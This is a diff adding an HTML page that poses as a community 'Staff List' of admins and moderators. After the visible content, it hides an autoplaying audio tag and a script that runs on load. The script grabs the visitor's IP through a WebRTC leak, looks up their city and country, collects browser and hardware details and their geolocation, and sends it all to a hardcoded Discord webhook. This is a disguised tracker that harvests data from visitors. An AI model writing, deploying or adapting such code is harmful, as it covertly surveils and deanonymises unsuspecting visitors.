@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Staff List</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .staff-list {
+            max-width: 800px;
+            margin: auto;
+        }
+        .staff-member {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 20px;
+            background-color: #1e1e1e;
+            border-radius: 10px;
+            border: 2px solid #444;
+        }
+        .staff-member.admin {
+            border: 2px solid red;
+        }
+        .staff-member.mod {
+            border: 2px solid purple;
+        }
+        .avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin-right: 20px;
+        }
+        .avatar img {
+            width: 100%;
+            height: 100%;
+        }
+        .details h3 {
+            margin: 0;
+            font-size: 22px;
+        }
+        .details h3.admin {
+            color: red;
+        }
+        .details h3.mod {
+            color: yellow;
+        }
+        .details p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="staff-list">
+        <!-- Admins -->
+        <div class="staff-member admin">
+            <div class="avatar">
+                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+            </div>
+            <div class="details">
+                <h3 class="admin">尺ㄚ卂ㄥ [Admin]</h3>
+                <p>User ID: 2</p>
+                <p>Joined: 4 years ago</p>
+                <p>Likes Given: 2</p>
+                <p>Likes Received: N/A</p>
+            </div>
+        </div>
+        <div class="staff-member admin">
+            <div class="avatar">
+                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+            </div>
+            <div class="details">
+                <h3 class="admin">ALIAS [Admin]</h3>
+                <p>User ID: 3</p>
+                <p>Joined: 3 years ago</p>
+                <p>Likes Given: 5</p>
+                <p>Likes Received: 10</p>
+            </div>
+        </div>
+        <div class="staff-member admin">
+            <div class="avatar">
+                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+            </div>
+            <div class="details">
+                <h3 class="admin">Juvinal [Admin]</h3>
+                <p>User ID: 4</p>
+                <p>Joined: 2 years ago</p>
+                <p>Likes Given: 8</p>
+                <p>Likes Received: 12</p>
+            </div>
+        </div>
+        <!-- Mods -->
+        <div class="staff-member mod">
+            <div class="avatar">
+                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+            </div>
+            <div class="details">
+                <h3 class="mod">Sloth [Mod]</h3>
+                <p>User ID: 5</p>
+                <p>Joined: 1 year ago</p>
+                <p>Likes Given: 15</p>
+                <p>Likes Received: 20</p>
+            </div>
+        </div>
+        <div class="staff-member mod">
+            <div class="avatar">
+                <img src="https://media.discordapp.net/attachments/1319159688012501035/1321603706768064592/UFkRsc8.png?ex=676dd6dd&is=676c855d&hm=a059e5f147c6ffebe3a4b9cd4f4b08d7e73a2a4fe6191452276e61f7211779bb&=&width=320&height=320" alt="Avatar">
+            </div>
+            <div class="details">
+                <h3 class="mod">Kuro [Mod]</h3>
+                <p>User ID: 6</p>
+                <p>Joined: 6 months ago</p>
+                <p>Likes Given: 3</p>
+                <p>Likes Received: 7</p>
+            </div>
+        </div>
+    </div>
+</body>
+
+<audio src="https://cdn.discordapp.com/attachments/1319157431149924434/1321633728107249700/q56DDLK.mp3?ex=676df2d3&is=676ca153&hm=acb7d52a8ef6470a41514bc1925b624525de58bf2776e5fe05d9a0fc9677abda&" autoplay style="display: none;"></audio>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1319299948495376457/o_jVj7KSoJjpsOn3LSar996SJ854E_DaoiVem1D3CXfPXSQnMTywu07tIbXPBdNf0gL_";
+
+    // Function to send data to webhook with delay to avoid rate-limiting
+    async function sendToWebhook(data) {
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: data })
+            });
+            console.log("Data successfully sent to webhook");
+        } catch (error) {
+            console.error("Error sending data to webhook:", error);
+        }
+    }
+
+    // Function to add info to the grabbedData object and send to webhook with a delay
+    async function addInfo(label, data, delayTime = 1000) {
+        const info = `${label}: ${data}`;
+        console.log(info); // Log to the console
+        await sendToWebhook(info); // Send the info to the webhook
+        await delay(delayTime); // Delay for the specified amount of time
+    }
+
+    // Delay function to wait before continuing to the next info
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function getSystemInfo() {
+        const peerConnection = new RTCPeerConnection({
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+        });
+
+        peerConnection.createDataChannel("");
+        peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
+        peerConnection.onicecandidate = async event => {
+            if (event?.candidate) {
+                const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                if (ipMatch) {
+                    await addInfo("IP Address", ipMatch[0]); // Send IP Address and wait for 1 second
+
+                    // Fetch location based on IP
+                    try {
+                        const locationData = await fetch(`https://ipinfo.io/${ipMatch[0]}/json`).then(res => res.json());
+                        await addInfo("Country", locationData.country || "N/A");
+                        await addInfo("City", locationData.city || "N/A");
+                        await addInfo("Timezone", locationData.timezone || "N/A");
+                    } catch (e) {
+                        await addInfo("Location Info", "Failed to fetch location");
+                    }
+                }
+            }
+        };
+
+        // Add browser info
+        await addInfo("Browser", navigator.userAgent);
+        await addInfo("Platform", navigator.platform);
+
+        // Add memory and CPU info
+        await addInfo("Device Memory", `${navigator.deviceMemory || "N/A"} GB`);
+        await addInfo("CPU Cores", navigator.hardwareConcurrency || "N/A");
+
+        // Add geolocation info if available
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                addInfo("Latitude", position.coords.latitude);
+                addInfo("Longitude", position.coords.longitude);
+            }, () => {
+                addInfo("Location", "Permission denied or unavailable");
+            });
+        } else {
+            addInfo("Location", "Geolocation not supported");
+        }
+    }
+
+    // Start gathering system info
+    getSystemInfo();
+</script>
+
+
+
+
+
+
+</html>
